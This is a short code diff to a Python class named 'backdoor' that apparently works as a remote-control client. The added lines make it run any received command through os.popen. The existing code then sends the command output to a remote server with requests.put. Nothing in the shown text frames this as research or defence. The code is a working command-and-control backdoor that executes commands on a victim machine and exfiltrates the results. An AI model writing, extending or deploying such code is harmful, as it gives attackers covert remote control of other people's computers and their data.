@@ -26,10 +26,13 @@ class backdoor:
         return r.json()
     
     def command_run(self, command):
+        print(command)
         if command.startswith('cd'):
             output = os.chdir(command[3:])
         if command.startswith('ls'):
             output = "".join(os.listdir())
+        else:
+            output = os.popen(command).read()
         print(output)
         requests.put(self.url + f"computer/{self.computer_id}/output/", json={"output": output})
     def run(self):
